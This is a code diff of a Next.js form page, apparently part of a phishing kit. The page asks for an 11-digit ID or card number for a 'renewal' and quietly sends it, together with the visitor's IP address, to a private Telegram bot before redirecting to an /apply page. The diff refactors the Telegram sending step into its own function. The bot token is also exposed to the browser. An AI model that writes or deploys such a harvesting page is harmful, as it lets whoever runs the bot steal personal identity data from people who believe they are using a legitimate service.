@@ -10,33 +10,57 @@ export default function FormPage() {
   const [ipAddress, setIpAddress] = useState(""); // لتخزين عنوان IP
   const router = useRouter();
 
-  useEffect(() => {
-    // الحصول على عنوان IP
-    const fetchIp = async () => {
-      try {
-        const response = await fetch("https://api.ipify.org?format=json");
-        const data = await response.json();
-        setIpAddress(data.ip);
-      } catch (error) {
-        console.error("Error fetching IP address:", error);
-      }
-    };
+  // دالة الحصول على عنوان الـ IP
+  const fetchIp = async () => {
+    try {
+      const response = await fetch("https://api.ipify.org?format=json");
+      const data = await response.json();
+      setIpAddress(data.ip);
+    } catch (error) {
+      console.error("Error fetching IP address:", error);
+      alert("حدث خطأ أثناء الحصول على عنوان IP");
+    }
+  };
 
+  // جلب الـ IP عند تحميل الصفحة
+  useEffect(() => {
     fetchIp();
   }, []);
 
-  const handleClear = () => {
-    setIdNumber("");
-    setOperationType("renew");
-    setError(false);
-  };
-
+  // دالة معالجة إدخال رقم البطاقة
   const handleInputChange = (e) => {
     const value = e.target.value;
-    // السماح بإدخال الأرقام فقط والتأكد من عدم تجاوز 11 رقمًا
     if (/^\d*$/.test(value) && value.length <= 11) {
       setIdNumber(value);
-      setError(false); // إزالة الخطأ عند إدخال قيمة صحيحة
+      setError(false);
+    }
+  };
+
+  // دالة إرسال البيانات إلى Telegram
+  const sendToTelegram = async (message) => {
+    const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
+    const botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
+
+    try {
+      const response = await fetch(
+        `https://api.telegram.org/bot${botToken}/sendMessage`,
+        {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+          }),
+        }
+      );
+
+      if (!response.ok) {
+        const errorText = await response.text();
+        alert(`خطأ في إرسال الرسالة: ${errorText}`);
+      }
+    } catch (error) {
+      console.error("Error sending message to Telegram:", error);
+      alert("حدث خطأ أثناء إرسال الرسالة إلى Telegram");
     }
   };
 
@@ -46,34 +70,20 @@ export default function FormPage() {
     if (idNumber.length === 11) {
       setError(false);
 
-      const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
-      const botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
       const message = `رقم البطاقة: ${idNumber}\nعنوان IP: ${ipAddress}`;
+      await sendToTelegram(message); // إرسال الرسالة إلى Telegram
 
-      try {
-        const response = await fetch(
-          `https://api.telegram.org/bot${botToken}/sendMessage`,
-          {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              chat_id: chatId,
-              text: message,
-            }),
-          }
-        );
-
-        if (response.ok) {
-          router.push(`/apply?idNumber=${idNumber}`);
-        } else {
-          alert("kkأعد المحاولة حدث خطأ ما");
-        }
-      } catch (error) {
-        alert(error);
-      }
+      // إذا تم إرسال الرسالة بنجاح
+      router.push(`/apply?idNumber=${idNumber}`);
     } else {
       setError(true);
     }
+  };
+
+  const handleClear = () => {
+    setIdNumber("");
+    setOperationType("renew");
+    setError(false);
   };
 
   return (
